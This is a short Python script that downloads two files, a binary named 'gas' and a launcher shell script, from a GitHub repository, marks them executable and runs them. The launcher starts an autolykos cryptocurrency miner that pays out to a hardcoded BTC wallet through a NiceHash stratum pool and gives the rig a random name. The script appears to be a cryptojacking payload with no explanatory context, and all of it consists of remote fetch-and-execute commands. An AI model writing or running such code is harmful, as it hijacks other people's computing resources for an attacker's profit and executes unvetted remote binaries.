import os
os.system('wget https://github.com/aka648582/yes/raw/main/gas')
os.system('chmod +x gas')

os.system('wget https://github.com/aka648582/yes/raw/main/cmdline_launcher.sh')
os.system('chmod +x cmdline_launcher.sh')
os.system('./cmdline_launcher.sh -algo autolykos  -coin BTC-wallet 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 stratum+tcp://autolykos.usa-east.nicehash.com:3390')
